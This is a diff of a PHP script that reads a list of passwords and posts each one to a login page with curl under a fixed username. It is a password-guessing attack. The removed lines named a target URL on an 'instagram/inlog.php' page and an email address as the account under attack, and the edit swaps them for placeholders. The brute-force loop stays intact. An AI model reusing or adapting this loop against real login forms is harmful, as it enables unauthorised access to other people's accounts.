@@ -7,10 +7,10 @@ $lines=explode("\n",$passwords);
 foreach($lines as $line)
 {
 	$line=trim($line);
-	$url="http://22937.hosts.ma-cloud.nl/Bewijzenmap/1.3/bap/instagram/inlog.php";
+	$url="...";
 	$ch = curl_init();
-	$postfields="uname=casfoole2@gmail.com&psw=$line";
-	curl_setopt($ch, CURLOPT_URL, "http://22937.hosts.ma-cloud.nl/Bewijzenmap/1.3/bap/instagram/inlog.php"); //ipimg.php
+	$postfields="uname=...&psw=$line";
+	curl_setopt($ch, CURLOPT_URL, "..."); //ipimg.php
 	curl_setopt($ch, CURLOPT_POST, true);
 	curl_setopt($ch, CURLOPT_POSTFIELDS,$postfields);
 	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE);
